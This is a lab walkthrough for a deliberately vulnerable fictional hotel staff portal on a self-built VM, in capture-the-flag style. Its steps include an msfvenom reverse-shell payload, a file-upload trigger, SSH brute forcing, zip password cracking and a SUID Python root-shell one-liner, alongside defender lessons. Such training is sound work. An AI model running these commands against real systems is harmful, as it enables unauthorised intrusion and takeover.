# Harborview Boutique Hotel — Lab Walkthrough (Metasploit Edition)

**Theme:** Harborview Boutique Hotel is a fictional small independent
hotel running a self-hosted PHP staff portal so new hires can upload an ID
photo during onboarding. The uploader was thrown together quickly and
performs no validation at all, so a PHP payload uploaded as-is executes
the moment it's requested — the perfect fit for an `msfvenom` payload and
`multi/handler`. A second, unrelated leftover (a guest-accessible Samba
share still holding an old password-protected payroll backup) and a
third, unrelated mistake (a debugging session that left the system Python
3 interpreter SUID-root) complete the chain to root.

Unlike the earlier labs in this set, this walkthrough is built specifically
around the **Metasploit Framework** (`msfconsole`, `msfvenom`, and a handful
of `auxiliary`/`post` modules) as the primary toolchain, alongside the
usual `nmap`/`gobuster`/cracking tools.

**Target OS:** Ubuntu Server (Linux) — chosen at random for this rotation.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_harborview.sh` target running on your own isolated lab VM only. Do
not run these techniques against systems you do not own or lack explicit
authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found in `frontdesk`'s home directory after logging in
  with a credential leaked via the file-upload RCE.
- `INTERMEDIATE_FLAG.txt` — found after cracking a password-protected
  archive pulled from a guest-accessible Samba share and pivoting to
  `housekeeping`.
- `HARD_FLAG.txt` — found after privilege escalation to root via a
  SUID-root Python interpreter.

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated, host-only
   or NAT'd network (no bridged/public NIC).
2. Copy `setup_harborview.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_harborview.sh
   sudo ./setup_harborview.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean restore
   point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity to
   the target's IP on the isolated network, and make sure the PostgreSQL
   database Metasploit uses is initialized:
   ```bash
   sudo systemctl start postgresql
   sudo msfdb init      # only needed the first time
   ```

---

## Part 1 – Enumeration

Launch `msfconsole` and use its built-in `db_nmap` so scan results land in
the Metasploit database automatically:

```bash
msfconsole -q
```

```
msf6 > db_nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

- `-sC` — nmap's default script set (banner grabs, common misconfig
  checks).
- `-sV` — service/version detection.
- `-p-` — all 65535 TCP ports.
- Running it as `db_nmap` (instead of plain `nmap`) stores the discovered
  hosts/services/ports in Metasploit's workspace so later modules (like
  `services`, `hosts`) can reference them directly.

Expect to see:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP
- `139/tcp`, `445/tcp` — Samba

Review what got recorded:

```
msf6 > services
```

Confirm the Samba version and share-enumeration details with a dedicated
auxiliary module:

```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS <target-ip>
msf6 auxiliary(scanner/smb/smb_version) > run
```

```
[+] <target-ip>:445 - Host is running Samba ...
```

List the shares it offers:

```
msf6 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS <target-ip>
msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBUser guest
msf6 auxiliary(scanner/smb/smb_enumshares) > run
```

```
[+] <target-ip>:445 - IPC$ - (IPC$)
[+] <target-ip>:445 - backoffice - (backoffice)
```

A guest-accessible `backoffice` share exists — noted for Part 4, but not
yet the way in.

Run a directory brute-force against the web app:

```
msf6 auxiliary(scanner/smb/smb_enumshares) > background
```
```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -x php -t 40
```

- `-u http://<target-ip>/` — target URL to scan.
- `-w /usr/share/wordlists/dirb/common.txt` — Kali's standard
  directory/filename wordlist.
- `-x php` — also try each wordlist entry with `.php` appended.
- `-t 40` — 40 concurrent threads.

```
/index.php          (Status: 200)
/upload.php          (Status: 200)
/uploads/            (Status: 301)
/staff_config.php    (Status: 200)
```

`staff_config.php` returns 200 but renders blank in a browser (it's valid
PHP with no output) — worth remembering, since PHP execution there is a
strong signal the server will execute anything else dropped in that
directory too.

---

## Part 2 – Identify Vulnerabilities

Three separate weaknesses need to be chained here before you reach root.

### 2a. Unrestricted file upload (initial access)

`upload.php` performs no extension check, MIME check, or content
inspection — it saves whatever is POSTed, under its original filename,
straight into `/uploads/`, a directory the web server executes PHP from.
Confirm the theory with something harmless first:

```bash
curl -s -F "idphoto=@/etc/hostname;filename=test.php" http://<target-ip>/upload.php
```

```
Uploaded to uploads/test.php
```

No rejection at all, regardless of content or extension — a full
unrestricted upload.

### 2b. Guest-accessible Samba share with a stale, password-protected
     archive (lateral movement, exploited in Part 4)

Already spotted in Part 1 (`backoffice`, guest-readable) — its contents
aren't pulled apart until Part 4.

### 2c. SUID-root Python interpreter (privilege escalation, confirmed in
     Part 5)

Not visible yet — discovered after landing on `housekeeping`.

---

## Part 3 – Gain Access

**Step 1 — Build a PHP meterpreter payload with `msfvenom`.**

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f raw -o shell.php
```

- `-p php/meterpreter/reverse_tcp` — PHP meterpreter stager, calls back to
  the attacker.
- `LHOST`/`LPORT` — where the payload connects back to.
- `-f raw` — output plain PHP source (the uploader doesn't care about
  extensions, so no need to disguise it).

**Step 2 — Start the listener.**

```bash
msfconsole -q
```

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <attacker-ip>
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run -j
```

- `-j` — run the handler as a background job so this console tab stays
  free to keep working while it waits for a callback.

**Step 3 — Upload and trigger the payload.**

```bash
curl -s -F "idphoto=@shell.php" http://<target-ip>/upload.php
curl -s http://<target-ip>/uploads/shell.php
```

The second `curl` requests the payload, which executes it and fires the
callback:

```
[*] Sending stage (...) ...
[*] Meterpreter session 1 opened (<attacker-ip>:4444 -> <target-ip>:...)
```

**Step 4 — Interact with the session and read the leaked credential.**

```
msf6 exploit(multi/handler) > sessions -i 1
meterpreter > getuid
Server username: www-data
meterpreter > shell
```

```bash
cat /var/www/html/staff_config.php
```

```
<?php
// Harborview staff portal config - internal use only
// front-desk shell account for onboarding scripts:
$FRONTDESK_USER = "frontdesk";
$FRONTDESK_PASS = "iloveyou1";
?>
```

A plaintext shell credential sitting next to the app code. Before trying
it, you could also validate it against SSH for practice with a
brute-force tool — `frontdesk:iloveyou1` is a genuine, well-known
`rockyou.txt` entry:

```bash
exit
```
```
meterpreter > background
```
```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
hydra -l frontdesk -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
```

- `-l frontdesk` — the known username, taken from the config file.
- `-P /usr/share/wordlists/rockyou.txt` — password wordlist to try.
- This will recover `frontdesk:iloveyou1` quickly — but you already have
  it directly from the leaked config, so this step is optional practice
  rather than a required part of the chain.

SSH in with the leaked credential:

```bash
ssh frontdesk@<target-ip>
# password: iloveyou1
```

Grab the first flag:

```bash
cat ~/EASY_FLAG.txt
```

**🚩 EASY_FLAG captured** — this one only required the unrestricted upload
and the leaked config credential, no cracking required.

---

## Part 4 – Lateral Movement / Intermediate Challenge

You already know from Part 1 that a guest-accessible `backoffice` Samba
share exists. Pull its contents with `smbclient`:

```bash
smbclient //<target-ip>/backoffice -N
```

- `-N` — suppress the password prompt and connect anonymously/as guest.

```
smb: \> ls
  payroll_backup.zip   ...
smb: \> get payroll_backup.zip
smb: \> exit
```

Try opening it:

```bash
unzip payroll_backup.zip
```

```
Archive:  payroll_backup.zip
[payroll_backup.zip] payroll_notes.csv password:
```

Password-protected. This is a completely different bug from the file
upload used for initial access — a stale credential-bearing archive
left on an internal file share that never should have allowed guest
access in the first place. Extract the hash for offline cracking:

```bash
zip2john payroll_backup.zip > payroll.hash
john --wordlist=/usr/share/wordlists/rockyou.txt payroll.hash
john --show payroll.hash
```

- `zip2john` — converts the zip's password-verification data into a
  format John the Ripper can attack.
- This recovers the archive password, `letmein1`, a genuine `rockyou.txt`
  entry.

If you'd rather use a tool built specifically for this instead of John,
`fcrackzip` works directly against the archive:

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt payroll_backup.zip
```

- `-u` — use `unzip` itself to validate each candidate (avoids false
  positives from zip's weak built-in check).
- `-D -p /usr/share/wordlists/rockyou.txt` — dictionary mode against the
  given wordlist.

Either way, unlock the archive:

```bash
unzip -P 'letmein1' payroll_backup.zip
cat payroll_notes.csv
```

```
housekeeping,poohbear1
```

Pivot to `housekeeping` (your session is a real TTY, so `su` works):

```bash
su housekeeping
# password: poohbear1
```

Grab the intermediate flag:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

(The credential also works directly over SSH if you'd rather pivot that
way instead of `su` — either gets you the same shell.)

---

## Part 5 – Privilege Escalation

Rather than hand-checking every SUID binary, use Metasploit's own local
enumeration module. Back in `msfconsole`, upgrade your foothold to a full
meterpreter session as `housekeeping` (SSH the credential in via
`sessions -u`, or simply re-run the Part 3 upload/handler flow and `su` in
the resulting shell) — then:

```
msf6 > sessions -i 1
meterpreter > shell
```

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/sudo
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/bin/python3.10
...
```

`python3.10` doesn't belong in that list — the interpreter itself should
never be SUID. Confirm the bit and its owner:

```bash
ls -l $(readlink -f $(command -v python3))
```

```
-rwsr-xr-x 1 root root ... /usr/bin/python3.10
```

`rws` in the owner triple means it runs as **root** regardless of who
executes it. This is a completely different bug from the upload RCE in
Part 3 or the Samba archive in Part 4 — a leftover `chmod u+s` from a
debugging session, and a textbook [GTFOBins Python SUID
entry](https://gtfobins.github.io/gtfobins/python/#suid) that needs no
custom helper binary or `$PATH` manipulation at all. If you'd rather have
this confirmed automatically instead of eyeballing `find` output, exit
back to meterpreter and run Metasploit's local exploit suggester:

```
exit
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

Trigger the GTFOBins pivot directly:

```
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1
meterpreter > shell
```

```bash
python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash -p")'
```

- `os.setuid(0)` / `os.setgid(0)` — since the interpreter process is
  already running with root's effective privileges (from the SUID bit),
  this makes that privilege permanent for the rest of the process instead
  of just being available.
- `os.system("/bin/bash -p")` — spawns a shell that inherits those
  privileges; `-p` tells `bash` to preserve them instead of dropping back
  to your real UID on startup.

```bash
id
```

You should see `uid=0(root)`.

---

## Part 6 – Capture the Three Flags

By the time you finish Part 5 you should have all three:

```bash
# Easy - frontdesk's home dir, reached via the upload RCE + leaked config (Part 3)
cat /home/frontdesk/EASY_FLAG.txt

# Intermediate - housekeeping's home dir, reached via the cracked Samba archive (Part 4)
cat /home/housekeeping/INTERMEDIATE_FLAG.txt

# Hard - root's home dir, reached via the SUID Python interpreter (Part 5)
cat /root/HARD_FLAG.txt
```

**🚩 EASY_FLAG, INTERMEDIATE_FLAG, and HARD_FLAG all captured.**

---

## Summary of the Vulnerability Chain

1. **Initial access — unrestricted file upload:** `upload.php` performs no
   extension, MIME, or content validation whatsoever, so an
   `msfvenom`-built PHP meterpreter payload uploads and executes exactly
   like any other file. That foothold reveals a plaintext front-desk
   shell credential sitting in a config file next to the app, bridging
   the web foothold directly to SSH.
2. **Lateral movement — a stale credential archive on a guest-accessible
   file share:** a Samba share meant for temporary file exchange with an
   outside contractor was left guest-readable indefinitely, and an old
   payroll backup archive on it still holds a second staff account's
   password. Password-protected zip archives need dedicated cracking
   tools (`zip2john`+John, or `fcrackzip`) — a different offline-cracking
   workflow from a plain password hash.
3. **Privilege escalation — a SUID-root Python interpreter:** a debugging
   session left the *stock* system Python 3 binary SUID-root, no custom
   helper or `$PATH` trickery required — a textbook, entirely real-world
   GTFOBins scenario, distinct from every custom-binary or
   permission/environment-based escalation primitive used elsewhere in
   this lab set.

**Root cause lessons for defenders:**
- Never trust client-supplied filenames or skip upload validation — check
  file content/MIME type, restrict the upload directory from executing
  scripts, and use an allow-list rather than a blacklist (or nothing at
  all).
- Never leave a file share guest-accessible longer than the specific
  temporary need that justified it, and clean up stale archives that
  outlive their purpose — "protected" by a password is not the same as
  access-controlled.
- Never run `chmod u+s` on a general-purpose interpreter (or any binary)
  as a debugging shortcut — audit for stray SUID bits regularly
  (`find / -perm -4000`) and treat any hit that isn't on Metasploit's own
  known-safe list as an incident.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk entirely
   rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `iloveyou1`, `poohbear1`, or `letmein1`
   anywhere real).
